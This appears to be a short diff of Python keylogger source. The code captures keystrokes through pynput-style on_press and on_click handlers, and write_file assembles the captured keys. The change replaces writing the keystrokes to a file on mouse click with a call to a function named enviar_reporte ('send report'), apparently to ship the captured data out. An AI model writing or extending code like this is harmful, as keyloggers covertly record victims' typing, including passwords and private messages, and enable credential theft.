@@ -74,13 +74,16 @@ def on_press(key):
 
 
 def on_click(x, y, boton, presionado):
-    global keys
     if presionado:
-        write_file(keys)
+        enviar_reporte(
+            "",
+            mensaje="",
+            nombre_archivo="",
+        )
 
 
 def write_file(keys):
-    global _numero_reporte, _numero_captura
+    global _numero_reporte
     with io.StringIO() as f:
         for key in keys:
             if key == Key.space:
